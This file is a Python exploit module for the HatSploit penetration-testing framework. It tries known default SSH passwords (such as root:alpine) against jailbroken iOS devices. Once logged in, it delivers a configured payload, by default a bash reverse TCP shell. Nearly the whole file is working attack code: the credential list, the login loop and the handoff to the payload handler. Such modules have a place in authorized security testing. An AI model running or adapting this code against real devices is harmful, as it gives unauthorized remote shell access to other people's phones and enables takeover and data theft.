"""
This module requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hatsploit.lib.module.basic import *
from hatsploit.lib.module.proto import SSH


class HatSploitModule(Module, SSH, Handler):
    def __init__(self):
        super().__init__()

        self.details.update({
            'Category': "exploit",
            'Name': "iOS SSH Cydia.app Default Password",
            'Module': "exploit/apple_ios/ssh/cydia_default_password",
            'Authors': [
                'Ivan Nikolsky (enty8080) - module developer',
            ],
            'Description': "Bypass iOS SSH authorization using Cydia.app default SSH password.",
            'Platform': "apple_ios",
            'Rank': "medium",
            'Payload': {
                'Value': "unix/generic/bash_reverse_tcp",
                'Architectures': ['armle', 'aarch64', 'generic'],
                'Platforms': ['apple_ios', 'unix'],
            }
        })

        self.username.visible = False
        self.password.visible = False

    def run(self):
        credentials = [
            ('root', 'dottie'),
            ('root', 'alpine'),
            ('mobile', 'dottie'),
            ('mobile', 'alpine'),
        ]

        for account in credentials:
            self.print_process(f"Attempt to log in as {account[0]}:{account[1]}...")

            self.username.set(account[0])
            self.password.set(account[1])

            client = self.open_ssh()

            try:
                client.connect()

                self.print_success(f"Logged in via {account[0]}:{account[1]}!")
                self.module_handle(
                    sender=client.send_command
                )

                client.disconnect()
                break

            except RuntimeError:
                self.print_error(f"Failed to log in via {account[0]}:{account[1]}!")
